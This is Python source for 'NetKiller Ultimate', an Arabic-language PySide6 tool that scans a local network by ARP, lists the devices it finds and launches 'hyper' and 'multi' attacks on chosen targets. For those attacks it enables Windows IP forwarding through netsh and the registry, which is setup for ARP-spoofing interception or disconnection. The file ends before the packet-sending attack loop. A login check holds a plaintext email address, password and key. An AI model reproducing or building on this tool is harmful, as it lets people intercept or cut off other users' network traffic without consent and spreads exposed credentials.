#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
=====================================================================
NetKiller Ultimate v12.4 - النسخة الفاخرة (موقع محسّن + تسجيل دخول أنظف)
=====================================================================
"""

import os
import sys
import ctypes
import socket
import threading
import datetime
import subprocess
import time
import re
import random
import base64
import math
import urllib.request
import json
from collections import deque

from PySide6.QtWidgets import *
from PySide6.QtCore import *
from PySide6.QtGui import *

# -------------------- التحقق من صلاحيات المسؤول --------------------
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# -------------------- تثبيت scapy إذا لزم الأمر --------------------
def install_scapy():
    try:
        from scapy.all import ARP, Ether, srp, send, sendp, conf
        global ARP, Ether, srp, send, sendp, conf
        if os.path.exists(r"C:\Windows\System32\Npcap"):
            conf.use_pcap = True
        return True
    except ImportError:
        print("⚠️ جاري تثبيت مكتبة scapy...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy"])
        return False

# -------------------- التحقق من وجود Npcap/WinPcap --------------------
def check_pcap():
    paths = [
        r"C:\Windows\System32\Npcap",
        r"C:\Program Files\Npcap",
        r"C:\Program Files (x86)\Npcap",
        r"C:\Windows\System32\Packet.dll"
    ]
    for path in paths:
        if os.path.exists(path):
            return True
    return False

# -------------------- الحصول على معلومات الشبكة --------------------
def get_network_info():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        result = subprocess.run('route print -4', shell=True, capture_output=True, text=True)
        gateway = None
        for line in result.stdout.splitlines():
            if '0.0.0.0' in line and local_ip.split('.')[0] in line:
                parts = line.split()
                if len(parts) > 2:
                    gateway = parts[2]
                    break
        if not gateway:
            gateway = ".".join(local_ip.split(".")[:3]) + ".1"
        result = subprocess.run('netsh interface ip show config', shell=True, capture_output=True, text=True)
        interface = "Wi-Fi"
        for line in result.stdout.splitlines():
            if "Wi-Fi" in line or "Ethernet" in line:
                interface = line.split()[0]
                break
        return local_ip, gateway, interface
    except:
        return None, None, None

# -------------------- الحصول على MAC بعدة طرق --------------------
mac_cache = {}
def get_mac(ip, retries=5, timeout=2):
    if ip in mac_cache:
        return mac_cache[ip]
    try:
        output = subprocess.check_output(f'arp -a {ip}', shell=True, text=True, stderr=subprocess.DEVNULL)
        for line in output.splitlines():
            if ip in line:
                parts = line.split()
                for part in parts:
                    if re.match(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', part):
                        mac = part.replace('-', ':').upper()
                        mac_cache[ip] = mac
                        return mac
    except:
        pass
    for i in range(retries):
        try:
            ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=timeout, verbose=0, retry=2)[0]
            if ans:
                mac = ans[0][1].hwsrc
                mac_cache[ip] = mac
                return mac
        except:
            pass
        time.sleep(0.5)
    try:
        subprocess.run(f'ping -n 1 -w 1000 {ip}', shell=True, capture_output=True, timeout=2)
        time.sleep(0.5)
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)[0]
        if ans:
            mac = ans[0][1].hwsrc
            mac_cache[ip] = mac
            return mac
    except:
        pass
    return None

# -------------------- تمكين / تعطيل IP forwarding --------------------
def enable_ip_forward(interface):
    try:
        subprocess.run(f'netsh interface ipv4 set interface "{interface}" forwarding=enabled', shell=True)
        subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" /v IPEnableRouter /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass

def disable_ip_forward(interface):
    try:
        subprocess.run(f'netsh interface ipv4 set interface "{interface}" forwarding=disabled', shell=True)
        subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" /v IPEnableRouter /t REG_DWORD /d 0 /f', shell=True)
    except:
        pass

# -------------------- الحصول على اسم الجهاز --------------------
def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        try:
            result = subprocess.run(f'nbtstat -A {ip}', shell=True, capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if '<00>' in line and 'UNIQUE' in line:
                    parts = line.split()
                    if len(parts) > 0:
                        return parts[0]
        except:
            pass
        return "Unknown"

# -------------------- تخمين نوع الجهاز --------------------
def guess_device_type(hostname, mac, ip=None):
    h = hostname.lower()
    vendors = {
        "00:11:22": "Samsung", "00:1E:DF": "Intel", "00:23:76": "Apple",
        "00:26:BB": "Apple", "08:00:27": "VirtualBox", "3C:5A:B4": "Intel",
        "50:46:5D": "Samsung", "5C:95:AE": "Xiaomi", "74:9A:4A": "Samsung",
        "8C:70:5A": "Dell", "9C:2E:A1": "Sony", "AC:84:C6": "LG",
        "B8:27:EB": "Raspberry Pi", "CC:2F:71": "Nokia", "D4:3A:2C": "Lenovo",
        "E8:9A:8F": "OnePlus", "F8:CF:C5": "Microsoft", "00:0C:29": "VMware",
        "00:50:56": "VMware", "00:05:69": "VMware", "00:1C:42": "Parallels",
        "00:15:5D": "Hyper-V", "00:25:90": "Cisco", "E0:46:9A": "TP-Link",
        "18:68:CB": "Huawei", "04:92:26": "Xiaomi", "7C:49:EB": "Google",
        "F4:5C:89": "Apple", "38:87:D5": "Apple", "10:9F:C0": "Samsung",
        "64:BC:11": "Amazon", "44:65:0D": "Amazon", "A0:02:DC": "Nest",
    }
    if "android" in h or "samsung" in h: return "📱 Android"
    if "iphone" in h or "ipad" in h or "apple" in h: return "🍏 Apple"
    if "xiaomi" in h or "redmi" in h: return "📱 Xiaomi"
    if "huawei" in h: return "📱 Huawei"
    if "windows" in h or "desktop" in h or "pc" in h: return "🖥️ Windows"
    if "linux" in h: return "🐧 Linux"
    if "raspberry" in h: return "🍓 Raspberry Pi"
    if "printer" in h: return "🖨️ Printer"
    if "tv" in h: return "📺 Smart TV"
    if "camera" in h: return "📷 Camera"
    if "google" in h or "nest" in h: return "🎤 Google"
    if "amazon" in h or "echo" in h: return "📦 Amazon"
    if "router" in h or "gateway" in h or "ap" in h: return "🌐 Router"
    for prefix, vendor in vendors.items():
        if mac.upper().startswith(prefix):
            return f"📱 {vendor}"
    if ip and ip.endswith(".1"):
        return "🌐 Gateway"
    return "🔌 Other"

# -------------------- دالة لإنشاء أيقونة مرعبة --------------------
def create_scary_icon():
    pixmap = QPixmap(64, 64)
    pixmap.fill(Qt.transparent)
    painter = QPainter(pixmap)
    painter.setRenderHint(QPainter.Antialiasing)
    painter.setBrush(QBrush(QColor(100, 0, 0)))
    painter.drawEllipse(0, 0, 64, 64)
    painter.setPen(QPen(Qt.white, 2))
    painter.setBrush(QBrush(Qt.white))
    painter.drawEllipse(16, 16, 32, 32)
    painter.setBrush(QBrush(Qt.black))
    painter.drawEllipse(24, 24, 6, 8)
    painter.drawEllipse(34, 24, 6, 8)
    painter.setPen(QPen(Qt.red, 2))
    painter.drawLine(28, 40, 36, 40)
    painter.setPen(QPen(Qt.red, 3))
    painter.drawLine(20, 10, 18, 2)
    painter.drawLine(44, 12, 46, 4)
    painter.end()
    return QIcon(pixmap)

# ==================== عناصر متحركة مرعبة (بدون نقاط حمراء) ====================
class GhostEye(QGraphicsEllipseItem):
    def __init__(self, x, y, parent=None):
        super().__init__(-8, -8, 16, 16, parent)
        self.setPos(x, y)
        self.setBrush(QBrush(Qt.white))
        self.pupil = QGraphicsEllipseItem(-3, -3, 6, 6, self)
        self.pupil.setBrush(QBrush(Qt.black))

    def update_pupil(self, mouse_pos):
        dx = mouse_pos.x() - self.x()
        dy = mouse_pos.y() - self.y()
        dist = math.hypot(dx, dy)
        if dist > 0:
            dx = dx / dist * 4
            dy = dy / dist * 4
        self.pupil.setPos(dx, dy)

# ==================== نافذة تسجيل الدخول (بدون نقاط حمراء، بتصميم أنيق) ====================
class LoginDialog(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("🔐 تسجيل الدخول - NetKiller Ultimate")
        self.setFixedSize(550, 480)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_TranslucentBackground)

        self.setWindowIcon(create_scary_icon())

        # خلفية متدرجة أنيقة
        self.setStyleSheet("""
            QDialog {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #3d1a1a, stop:0.5 #6d2a2a, stop:1 #3d1a1a);
                border: 2px solid #b30000;
                border-radius: 25px;
            }
        """)

        # مشهد للعيون فقط (بدون قطرات)
        self.scene = QGraphicsScene(0, 0, 550, 480)
        self.view = QGraphicsView(self.scene)
        self.view.setParent(self)
        self.view.setGeometry(0, 0, 550, 480)
        self.view.setStyleSheet("background: transparent; border: none;")
        self.view.setRenderHint(QPainter.Antialiasing)

        # طبقة شفافة خفيفة جداً
        self.scene.addRect(0, 0, 550, 480, QPen(Qt.NoPen), QBrush(QColor(0, 0, 0, 30)))

        # عيون شبحية فقط
        self.eyes = []
        eye1 = GhostEye(200, 180)
        eye2 = GhostEye(350, 180)
        self.scene.addItem(eye1)
        self.scene.addItem(eye2)
        self.eyes.append(eye1)
        self.eyes.append(eye2)

        # إطار داخلي شفاف
        self.inner_frame = QFrame(self)
        self.inner_frame.setGeometry(50, 50, 450, 380)
        self.inner_frame.setStyleSheet("""
            QFrame {
                background-color: rgba(20, 0, 0, 200);
                border: 2px solid #ff4444;
                border-radius: 20px;
            }
        """)

        layout = QVBoxLayout(self.inner_frame)
        layout.setContentsMargins(25, 25, 25, 25)
        layout.setSpacing(15)

        # شعار
        self.logo = QLabel("🔥 NETKILLER 🔥")
        self.logo.setStyleSheet("font-size: 32px; font-weight: bold; color: #ff6666; background: transparent; letter-spacing: 2px;")
        self.logo.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.logo)

        self.blink_timer = QTimer()
        self.blink_timer.timeout.connect(self.blink_logo)
        self.blink_timer.start(600)

        warning = QLabel("⚠️ ACCESS RESTRICTED ⚠️")
        warning.setStyleSheet("color: #ffcc00; font-size: 14px; background: transparent; font-weight: bold;")
        warning.setAlignment(Qt.AlignCenter)
        layout.addWidget(warning)

        # حقول الإدخال
        self.email_edit = QLineEdit()
        self.email_edit.setPlaceholderText("البريد الإلكتروني")
        self.email_edit.setStyleSheet("""
            QLineEdit {
                background-color: #440000;
                color: #ffffff;
                border: 2px solid #ff6666;
                border-radius: 10px;
                padding: 12px;
                font-size: 14px;
            }
            QLineEdit:focus {
                border-color: #ffaa00;
                background-color: #550000;
            }
        """)
        layout.addWidget(self.email_edit)

        self.password_edit = QLineEdit()
        self.password_edit.setPlaceholderText("كلمة المرور")
        self.password_edit.setEchoMode(QLineEdit.Password)
        self.password_edit.setStyleSheet("""
            QLineEdit {
                background-color: #440000;
                color: #ffffff;
                border: 2px solid #ff6666;
                border-radius: 10px;
                padding: 12px;
                font-size: 14px;
            }
            QLineEdit:focus {
                border-color: #ffaa00;
                background-color: #550000;
            }
        """)
        layout.addWidget(self.password_edit)

        self.key_edit = QLineEdit()
        self.key_edit.setPlaceholderText("المفتاح")
        self.key_edit.setStyleSheet("""
            QLineEdit {
                background-color: #440000;
                color: #ffffff;
                border: 2px solid #ff6666;
                border-radius: 10px;
                padding: 12px;
                font-size: 14px;
            }
            QLineEdit:focus {
                border-color: #ffaa00;
                background-color: #550000;
            }
        """)
        layout.addWidget(self.key_edit)

        login_btn = QPushButton("دخول")
        login_btn.setStyleSheet("""
            QPushButton {
                background-color: #b30000;
                color: white;
                border: none;
                border-radius: 10px;
                padding: 14px;
                font-weight: bold;
                font-size: 16px;
            }
            QPushButton:hover {
                background-color: #d40000;
                border: 2px solid #ffaa00;
            }
        """)
        login_btn.clicked.connect(self.check_credentials)
        layout.addWidget(login_btn)

        self.show_password_cb = QCheckBox("إظهار كلمة المرور")
        self.show_password_cb.setStyleSheet("color: #ffcccc; background: transparent; font-size: 12px;")
        self.show_password_cb.stateChanged.connect(self.toggle_password_visibility)
        layout.addWidget(self.show_password_cb)

        self.animation_timer = QTimer()
        self.animation_timer.timeout.connect(self.advance_animation)
        self.animation_timer.start(30)

        self.setMouseTracking(True)
        self.view.setMouseTracking(True)

        self.shake_timer = QTimer()
        self.shake_timer.timeout.connect(self.shake_window)
        self.shake_timer.start(4000)

    def mouseMoveEvent(self, event):
        for eye in self.eyes:
            eye.update_pupil(event.pos())
        super().mouseMoveEvent(event)

    def advance_animation(self):
        self.scene.advance()

    def blink_logo(self):
        if "color: #ff6666" in self.logo.styleSheet():
            self.logo.setStyleSheet("font-size: 32px; font-weight: bold; color: #ffaa00; background: transparent; letter-spacing: 2px;")
        else:
            self.logo.setStyleSheet("font-size: 32px; font-weight: bold; color: #ff6666; background: transparent; letter-spacing: 2px;")

    def shake_window(self):
        pos = self.pos()
        offset = random.randint(-3, 3)
        self.move(pos.x() + offset, pos.y())

    def toggle_password_visibility(self, state):
        if state == Qt.Checked:
            self.password_edit.setEchoMode(QLineEdit.Normal)
        else:
            self.password_edit.setEchoMode(QLineEdit.Password)

    def check_credentials(self):
        email = self.email_edit.text().strip()
        password = self.password_edit.text().strip()
        key = self.key_edit.text().strip()
        if email == "thegost11223390@gmail.com" and password == "AZOOZ@14009" and key == "ahh":
            self.accept()
        else:
            QMessageBox.warning(self, "خطأ", "البيانات غير صحيحة")

# ==================== النافذة الرئيسية ====================
class NetKillerWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("🔥 NetKiller Ultimate v12.4 - النسخة الفاخرة")
        self.setGeometry(100, 100, 1600, 900)

        self.bg_dark = "#1a0d0d"
        self.bg_medium = "#2d1a1a"
        self.bg_light = "#3d2a2a"
        self.accent_primary = "#cc6666"
        self.accent_secondary = "#a52a2a"
        self.accent_tertiary = "#b85c5c"
        self.accent_danger = "#b30000"
        self.text_primary = "#f0e0e0"
        self.text_secondary = "#d4b8b8"

        self.setStyleSheet(f"""
            QMainWindow {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 {self.bg_dark}, stop:0.5 {self.bg_medium}, stop:1 {self.bg_dark});
            }}
            QWidget {{
                background: transparent;
                color: {self.text_primary};
                font-family: 'Segoe UI';
            }}
            QPushButton {{
                background-color: {self.accent_secondary};
                color: white;
                border: 2px solid {self.accent_danger};
                border-radius: 6px;
                padding: 8px 16px;
                font-weight: bold;
                font-size: 10pt;
            }}
            QPushButton:hover {{
                background-color: {self.accent_tertiary};
                border: 2px solid #ff8888;
            }}
            QPushButton:disabled {{
                background-color: #333;
                color: #666;
                border: 1px solid #444;
            }}
            QTableWidget {{
                background-color: rgba(40, 10, 10, 200);
                alternate-background-color: rgba(60, 20, 20, 200);
                gridline-color: {self.accent_secondary};
                selection-background-color: {self.accent_secondary};
                border: 2px solid {self.accent_danger};
                border-radius: 5px;
            }}
            QHeaderView::section {{
                background-color: {self.accent_secondary};
                color: white;
                padding: 5px;
                font-weight: bold;
                border: 1px solid {self.accent_danger};
            }}
            QTextEdit {{
                background-color: rgba(30, 10, 10, 200);
                color: {self.text_primary};
                border: 2px solid {self.accent_danger};
                border-radius: 6px;
            }}
            QProgressBar {{
                border: 2px solid {self.accent_danger};
                background-color: rgba(40, 10, 10, 200);
                height: 10px;
                border-radius: 5px;
            }}
            QProgressBar::chunk {{
                background-color: {self.accent_secondary};
                border-radius: 5px;
            }}
            QTabWidget::pane {{
                border: 2px solid {self.accent_danger};
                background-color: rgba(30, 10, 10, 180);
                border-radius: 5px;
            }}
            QTabBar::tab {{
                background-color: rgba(40, 10, 10, 200);
                color: {self.text_primary};
                padding: 8px 16px;
                border: 1px solid {self.accent_danger};
                border-bottom: none;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }}
            QTabBar::tab:selected {{
                background-color: {self.accent_secondary};
                color: white;
            }}
            QMenu {{
                background-color: rgba(30, 10, 10, 230);
                border: 1px solid {self.accent_danger};
            }}
            QMenu::item {{
                padding: 5px 20px;
                color: {self.text_primary};
            }}
            QMenu::item:selected {{
                background-color: {self.accent_secondary};
            }}
        """)

        self.devices = []
        self.scanning = False
        self.attack_running = False
        self.targets = []
        self.gateway_ip = None
        self.gateway_mac = None
        self.interface = None
        self.attack_thread = None
        self.blacklist = set()
        self.attack_speed = 0.0005
        self.packet_count = 0
        self.start_time = None

        self.local_ip, self.gateway_ip, self.interface = get_network_info()
        if self.gateway_ip:
            self.gateway_mac = get_mac(self.gateway_ip, retries=5, timeout=2)

        self.setup_ui()
        QTimer.singleShot(2000, self.start_scan)

    def setup_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setContentsMargins(15, 15, 15, 15)
        main_layout.setSpacing(10)

        # شريط العنوان
        title_widget = QWidget()
        title_widget.setFixedHeight(90)
        title_widget.setStyleSheet("background-color: rgba(30, 10, 10, 200); border: 2px solid #b30000; border-radius: 12px;")
        title_layout = QHBoxLayout(title_widget)
        title_layout.setContentsMargins(25, 0, 25, 0)

        logo_label = QLabel("🔥 NETKILLER ULTIMATE v12.4")
        logo_label.setStyleSheet("color: #cc6666; font-size: 26pt; font-weight: bold; background: transparent;")
        title_layout.addWidget(logo_label)

        vline = QFrame()
        vline.setFrameShape(QFrame.VLine)
        vline.setStyleSheet("color: #b30000;")
        vline.setFixedWidth(2)
        title_layout.addWidget(vline)

        info_label = QLabel(f"الواجهة: {self.interface}  |  IP: {self.local_ip}  |  البوابة: {self.gateway_ip}")
        info_label.setStyleSheet("color: #d4b8b8; font-size: 12pt; background: transparent;")
        title_layout.addWidget(info_label)
        title_layout.addStretch()
        main_layout.addWidget(title_widget)

        # شريط معلومات الشبكة
        net_widget = QWidget()
        net_widget.setFixedHeight(45)
        net_widget.setStyleSheet("background-color: rgba(40, 10, 10, 200); border: 2px solid #b30000; border-radius: 8px;")
        net_layout = QHBoxLayout(net_widget)
        net_layout.setContentsMargins(20, 0, 20, 0)

        gateway_text = f"🌐 البوابة: {self.gateway_ip}"
        if self.gateway_mac:
            gateway_text += f" | MAC: {self.gateway_mac[:17]}"
        else:
            gateway_text += " | ⚠️ MAC غير معروف"

        self.network_label = QLabel(gateway_text)
        self.network_label.setStyleSheet("color: #f0e0e0; background: transparent;")
        net_layout.addWidget(self.network_label)

        self.status_label = QLabel("⚡ جاهز")
        self.status_label.setStyleSheet("color: #cc6666; background: transparent; font-weight: bold;")
        net_layout.addWidget(self.status_label, alignment=Qt.AlignRight)
        main_layout.addWidget(net_widget)

        # أزرار التحكم
        btn_layout = QHBoxLayout()
        btn_layout.setSpacing(8)

        self.scan_btn = QPushButton("🔍 فحص الشبكة")
        self.scan_btn.clicked.connect(self.start_scan)
        btn_layout.addWidget(self.scan_btn)

        self.hyper_btn = QPushButton("⚡ هجوم خارق")
        self.hyper_btn.clicked.connect(self.open_attack_window)
        self.hyper_btn.setEnabled(False)
        btn_layout.addWidget(self.hyper_btn)

        self.multi_btn = QPushButton("💥 هجوم متعدد")
        self.multi_btn.clicked.connect(self.multi_attack_window)
        self.multi_btn.setEnabled(False)
        btn_layout.addWidget(self.multi_btn)

        self.stop_btn = QPushButton("⏹️ إيقاف")
        self.stop_btn.clicked.connect(self.stop_attack)
        self.stop_btn.setEnabled(False)
        btn_layout.addWidget(self.stop_btn)

        self.save_btn = QPushButton("💾 حفظ التقرير")
        self.save_btn.clicked.connect(self.save_report)
        self.save_btn.setEnabled(False)
        btn_layout.addWidget(self.save_btn)

        self.show_people_btn = QPushButton("👥 عرض الأشخاص")
        self.show_people_btn.clicked.connect(self.show_people_list)
        self.show_people_btn.setEnabled(False)
        btn_layout.addWidget(self.show_people_btn)

        self.auto_check = QCheckBox("🔄 تحديث تلقائي")
        self.auto_check.setChecked(True)
        self.auto_check.setStyleSheet("color: #f0e0e0; background: transparent;")
        btn_layout.addWidget(self.auto_check)
        btn_layout.addStretch()
        main_layout.addLayout(btn_layout)

        # جدول الأجهزة
        table_label = QLabel("📱 الأجهزة المكتشفة")
        table_label.setStyleSheet("color: #cc6666; font-size: 18pt; font-weight: bold;")
        main_layout.addWidget(table_label)

        self.device_table = QTableWidget()
        self.device_table.setColumnCount(6)
        self.device_table.setHorizontalHeaderLabels(["#", "IP", "MAC", "Hostname", "النوع", "حالة MAC"])
        self.device_table.setAlternatingRowColors(True)
        self.device_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.device_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.device_table.horizontalHeader().setStretchLastSection(True)
        self.device_table.setColumnWidth(0, 50)
        self.device_table.setColumnWidth(1, 140)
        self.device_table.setColumnWidth(2, 170)
        self.device_table.setColumnWidth(3, 350)
        self.device_table.setColumnWidth(4, 150)
        self.device_table.setColumnWidth(5, 100)
        self.device_table.setMaximumHeight(250)
        self.device_table.doubleClicked.connect(self.show_device_details)
        self.device_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.device_table.customContextMenuRequested.connect(self.popup_menu)
        main_layout.addWidget(self.device_table)

        # إحصائيات
        stats_widget = QWidget()
        stats_widget.setFixedHeight(40)
        stats_widget.setStyleSheet("background-color: rgba(40, 10, 10, 200); border: 2px solid #b30000; border-radius: 6px;")
        stats_layout = QHBoxLayout(stats_widget)
        stats_layout.setContentsMargins(15, 0, 15, 0)

        self.stats_label = QLabel("📊 0 حزمة | 0/ث | 00:00:00 | الأهداف: -")
        self.stats_label.setStyleSheet("color: #cc6666; background: transparent; font-weight: bold;")
        stats_layout.addWidget(self.stats_label)
        main_layout.addWidget(stats_widget)

        # شريط التقدم
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 0)
        self.progress_bar.setVisible(False)
        main_layout.addWidget(self.progress_bar)

        # سجل العمليات
        log_label = QLabel("📋 سجل العمليات")
        log_label.setStyleSheet("color: #cc6666; font-weight: bold; font-size: 16px;")
        main_layout.addWidget(log_label)

        self.log_text = QTextEdit()
        self.log_text.setMaximumHeight(120)
        self.log_text.setReadOnly(True)
        main_layout.addWidget(self.log_text)

        self.log("✅ تم تحميل الأداة. جاهز للهجوم الخارق!")

    def log(self, msg, sound=False):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        self.log_text.append(f"[{ts}] {msg}")

    # ===== دوال الشبكة والهجوم =====
    def start_scan(self):
        if self.scanning: return
        self.scanning = True
        self.scan_btn.setEnabled(False)
        self.scan_btn.setText("🔍 جاري...")
        self.status_label.setText("⏳ مسح الشبكة...")
        self.progress_bar.setVisible(True)
        self.log("بدء فحص الشبكة...")
        threading.Thread(target=self.scan_network, daemon=True).start()

    def scan_network(self):
        try:
            if not self.local_ip:
                self.scan_error("لا يمكن تحديد عنوان IP المحلي")
                return
            network = ".".join(self.local_ip.split(".")[:3]) + ".0/24"
            self.log(f"🔍 فحص الشبكة: {network}")
            arp = ARP(pdst=network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            result = srp(ether/arp, timeout=5, verbose=0, retry=2)[0]
            devices = []
            idx = 1
            for sent, received in result:
                ip = received.psrc
                mac = received.hwsrc
                hostname = get_hostname(ip)
                dtype = guess_device_type(hostname, mac, ip)
                verified_mac = get_mac(ip, retries=2, timeout=1)
                mac_status = "✅ معروف" if verified_mac else "⚠️ غير معروف"
                devices.append((idx, ip, mac, hostname, dtype, mac_status))
                idx += 1
            if not devices:
                self.log("⚠️ لم يتم العثور على أجهزة عبر ARP، جرب arp -a")
                try:
                    output = subprocess.check_output("arp -a", shell=True, text=True)
                    for line in output.splitlines():
                        parts = line.split()
                        if len(parts) >= 3 and parts[0].count('.') == 3:
                            ip = parts[0]
                            mac = parts[1] if len(parts[1]) == 17 else "غير معروف"
                            if ip != self.local_ip and not ip.startswith("224.") and not ip.startswith("239."):
                                hostname = get_hostname(ip)
                                dtype = guess_device_type(hostname, mac, ip)
                                verified_mac = get_mac(ip, retries=2, timeout=1)
                                mac_status = "✅ معروف" if verified_mac else "⚠️ غير معروف"
                                devices.append((idx, ip, mac, hostname, dtype, mac_status))
                                idx += 1
                except Exception as e:
                    self.log(f"⚠️ فشل arp -a: {e}")
            self.devices = devices
            self.update_table(devices)
            self.log(f"✅ تم العثور على {len(devices)} جهاز")
        except Exception as e:
            self.scan_error(str(e))
        finally:
            self.scanning = False
            self.scan_btn.setEnabled(True)
            self.scan_btn.setText("🔍 فحص الشبكة")
            self.progress_bar.setVisible(False)
            if self.auto_check.isChecked():
                QTimer.singleShot(30000, self.start_scan)

    def update_table(self, devices):
        self.device_table.setRowCount(len(devices))
        for row, dev in enumerate(devices):
            for col, val in enumerate(dev):
                self.device_table.setItem(row, col, QTableWidgetItem(str(val)))
        self.status_label.setText(f"✅ {len(devices)} جهاز")
        self.hyper_btn.setEnabled(bool(devices))
        self.multi_btn.setEnabled(bool(devices))
        self.save_btn.setEnabled(bool(devices))
        self.show_people_btn.setEnabled(bool(devices))

    def scan_error(self, error):
        self.status_label.setText(f"❌ خطأ: {error}")
        self.log(f"❌ خطأ: {error}")
        self.scan_btn.setEnabled(True)
        self.scan_btn.setText("🔍 فحص الشبكة")
        self.progress_bar.setVisible(False)

    def popup_menu(self, pos):
        selected = self.device_table.currentRow()
        if selected < 0: return
        idx, ip, mac, hostname, dtype, mac_status = self.devices[selected]
        menu = QMenu()
        menu.addAction("⚡ هجوم خارق", lambda: self.start_hyper_attack([(ip, mac)]))
        menu.addAction("📋 تفاصيل", lambda: self.show_device_details_dialog((ip, mac, hostname, dtype)))
        menu.addAction("➕ إضافة إلى القائمة السوداء", lambda: self.add_to_blacklist(ip, mac))
        menu.addAction("🔍 فحص المنافذ", lambda: self.scan_ports(ip))
        menu.addAction("🎯 إضافة إلى الهجوم المتعدد", lambda: self.add_to_multi_target(ip, mac))
        menu.addAction("🌍 موقع الجهاز", lambda: self.show_device_location(ip))
        menu.addSeparator()
        menu.addAction("🔄 تحديث MAC", lambda: self.refresh_mac(ip, row=selected))
        menu.exec(self.device_table.viewport().mapToGlobal(pos))

    def show_device_details(self, index):
        row = index.row()
        if 0 <= row < len(self.devices):
            idx, ip, mac, hostname, dtype, mac_status = self.devices[row]
            self.show_device_details_dialog((ip, mac, hostname, dtype))

    def show_device_details_dialog(self, values):
        ip, mac, hostname, dtype = values
        QMessageBox.information(self, "معلومات الجهاز", f"🔍 تفاصيل الجهاز:\n• IP: {ip}\n• MAC: {mac}\n• الاسم: {hostname}\n• النوع: {dtype}")

    def refresh_mac(self, ip, row):
        new_mac = get_mac(ip, retries=3, timeout=2)
        if new_mac:
            self.devices[row] = (self.devices[row][0], ip, new_mac, self.devices[row][3], self.devices[row][4], "✅ معروف")
            self.update_table(self.devices)
            self.log(f"🔄 تم تحديث MAC لـ {ip} -> {new_mac}")
        else:
            self.log(f"⚠️ فشل تحديث MAC لـ {ip}")

    # ===== دالة الموقع المحسّنة (مع إظهار الرابط في السجل ورسالة توضيحية للـ IP الخاص) =====
    def show_device_location(self, ip):
        self.log(f"🌍 جاري الحصول على موقع {ip}...")
        threading.Thread(target=self._fetch_location, args=(ip,), daemon=True).start()

    def _fetch_location(self, ip):
        try:
            # التحقق مما إذا كان IP خاصاً (لن يعطى موقع حقيقي)
            if ip.startswith("10.") or ip.startswith("172.16.") or ip.startswith("172.17.") or ip.startswith("172.18.") or ip.startswith("172.19.") or ip.startswith("172.20.") or ip.startswith("172.21.") or ip.startswith("172.22.") or ip.startswith("172.23.") or ip.startswith("172.24.") or ip.startswith("172.25.") or ip.startswith("172.26.") or ip.startswith("172.27.") or ip.startswith("172.28.") or ip.startswith("172.29.") or ip.startswith("172.30.") or ip.startswith("172.31.") or ip.startswith("192.168.") or ip == "127.0.0.1":
                self.log(f"⚠️ {ip} هو عنوان خاص (شبكة محلية) ولا يمكن تحديد موقعه الجغرافي.")
                return

            # استخدام خدمة ip-api.com
            url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,as"
            with urllib.request.urlopen(url, timeout=5) as response:
                data = json.loads(response.read().decode())
                if data.get('status') == 'success':
                    lat = data['lat']
                    lon = data['lon']
                    country = data['country']
                    region = data['regionName']
                    city = data['city']
                    maps_url = f"https://www.google.com/maps?q={lat},{lon}"
                    self.log(f"📍 {ip} -> {country}, {region}, {city} | الرابط: {maps_url}")
                else:
                    error = data.get('message', 'خطأ غير معروف')
                    self.log(f"⚠️ فشل الحصول على موقع {ip}: {error}")
        except Exception as e:
            self.log(f"⚠️ خطأ في الاتصال بخدمة الموقع: {str(e)}")

    # ===== دوال الهجوم (كما هي) =====
    def start_hyper_attack(self, targets):
        if self.attack_running:
            QMessageBox.warning(self, "تنبيه", "هجوم آخر قيد التشغيل. أوقفه أولاً.")
            return
        if not self.gateway_mac:
            self.gateway_mac = get_mac(self.gateway_ip, retries=5, timeout=2)
        if not self.gateway_mac:
            reply = QMessageBox.question(self, "⚠️ تحذير",
                                         f"لم يُعثر على MAC للبوابة {self.gateway_ip}.\nالمتابعة قد لا تنجح. هل تريد المتابعة باستخدام عنوان بث؟")
            if reply != QMessageBox.Yes:
                return
            self.gateway_mac = "ff:ff:ff:ff:ff:ff"
            self.log("⚠️ استخدام عنوان بث للبوابة")
        valid_targets = []
        for ip, mac in targets:
            m = get_mac(ip, retries=3, timeout=1)
            if m:
                valid_targets.append((ip, m))
            else:
                self.log(f"⚠️ تخطي {ip} (لا يستجيب)")
        if not valid_targets:
            QMessageBox.critical(self, "خطأ", "لا توجد أهداف صالحة.")
            return
        self.targets = valid_targets
        self.attack_running = True
        self.stop_btn.setEnabled(True)
        self.packet_count = 0
        self.start_time = time.time()
        self.log(f"🔥 بدء هجوم خارق على {len(valid_targets)} جهاز", sound=False)
        enable_ip_forward(self.interface)
